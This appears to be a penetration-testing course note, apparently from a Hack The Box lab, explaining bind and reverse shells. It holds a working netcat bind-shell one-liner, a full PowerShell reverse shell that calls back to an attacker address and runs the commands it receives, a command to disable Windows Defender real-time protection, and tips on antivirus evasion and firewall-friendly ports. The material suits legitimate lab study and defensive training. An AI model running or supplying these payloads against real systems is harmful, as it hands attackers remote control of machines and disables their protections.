# 🛰️ Introduction to Shell Basics

Understanding shell basics is fundamental to penetration testing, allowing for effective post-exploitation activities and maintaining access within a compromised network.

## Bind Shells

### What Is It?

With a **bind shell**, the target system listens on a specific port. The attacker then initiates a connection from an external machine to the listening port on the target.

```
[Target System] ------> [Attack Box]
10.129.36.68:7777              10.10.14.55
```

### Advantages of Bind Shells

- **Ease of Use**: Simple to set up and maintain.
- **Controlled Environment**: The target system is the server, allowing for easier control.

### Payload Example (Linux)

A common bind shell payload in Linux involves creating a named pipe and initiating a listening netcat process:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 7777 > /tmp/f
```

### Disadvantages

- **Visibility**: Easier to detect by network monitoring tools.
- **Firewalls**: Inbound connections may be blocked.

## Reverse Shells

### What Is It?

With a **reverse shell**, the attacker sets up a listener on their machine, and the target system initiates an outbound connection back to the attacker's machine. 

```
[Attack Box with Listener] <----- [Target System]
10.10.14.55:443                  10.129.36.68
```

### Advantages of Reverse Shells

- **Firewall Evasion**: Outbound connections are less likely to be blocked.
- **Common Ports**: Can use common ports like 80, 443 which are rarely restricted.
- **Detection Evasion**: Harder for security tools to detect.

### Hands-on with a Simple Reverse Shell in Windows

#### Step 1: Start Netcat Listener (Attack Box)

```bash
kabaneridev@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

**Why Port 443?**
- Common HTTPS port.
- Rarely blocked outbound.

#### Step 2: PowerShell Reverse Shell (Target)

A simple reverse shell using PowerShell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.55',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

#### Step 3: Dealing with Antivirus

**Common AV Response:**

```powershell
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.55',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

**Disable Windows Defender (Administrative PowerShell):**

```powershell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Step 4: Successful Connection

On the attack box:

```bash
kabaneridev@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

### PowerShell Reverse Shell Payload Breakdown

The PowerShell reverse shell payload consists of:

- **TCP Client Creation**: `New-Object System.Net.Sockets.TCPClient('IP',PORT)`
- **Stream Management**: `$client.GetStream()`
- **Data Buffer**: `[byte[]]$bytes = 0..65535|%{0}`
- **Read Loop**: Continuously read from stream
- **Command Execution**: `iex $data` (Invoke-Expression)
- **Output Formatting**: Add PS prompt and path
- **Data Transmission**: Send results back to attack box
- **Connection Management**: Flush and close when done

### Common Ports for Reverse Shells

**Commonly Allowed Outbound Ports:**
- **80** (HTTP)
- **443** (HTTPS)
- **53** (DNS)
- **22** (SSH)
- **21** (FTP)
- **25** (SMTP)
- **110** (POP3)
- **143** (IMAP)

These ports work well because they are essential for business operations and rarely blocked by firewalls.

### Best Practices

#### For Bind Shells:
- Use only when necessary.
- Consider firewall implications.
- Test from internal network position.
- Use common service ports when possible.

#### For Reverse Shells:
- Prefer over bind shells when possible.
- Use common outbound ports.
- Consider AV/EDR evasion techniques.
- Test payload delivery methods.
- Understand target environment.

#### General Considerations:
- Always test in controlled environments first.
- Understand network topology.
- Consider detection mechanisms.
- Have backup methods ready.
- Document successful techniques.

### Troubleshooting

**Common Issues:**
1. **Connection Refused**: Check firewall rules and port availability.
2. **AV Detection**: Use evasion techniques or disable temporarily.
3. **Network Restrictions**: Try different ports or protocols.
4. **Payload Failures**: Verify syntax and target compatibility.
5. **Unstable Connections**: Check network stability and MTU issues.

**Debugging Commands:**
```bash
# Check listening ports
netstat -tlnp

# Test connectivity
telnet target_ip target_port

# Check firewall status (Linux)
ufw status

# Check firewall status (Windows)
netsh advfirewall show allprofiles
```

## Summary

Understanding shell basics is fundamental to penetration testing:

- **Bind Shells**: Target listens, attacker connects.
- **Reverse Shells**: Attacker listens, target connects (preferred method).
- **Netcat**: Swiss-Army knife for network connections.
- **PowerShell**: Native Windows capability for reverse shells.
- **Port Selection**: Use common ports for better success rates.
- **Evasion**: Consider AV/EDR and firewall restrictions.

The next sections will cover advanced payloads, platform-specific techniques, and web shells for maintaining persistence and escalating privileges. 

---

[!INFO] References:
- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [[Netcat]] for network connections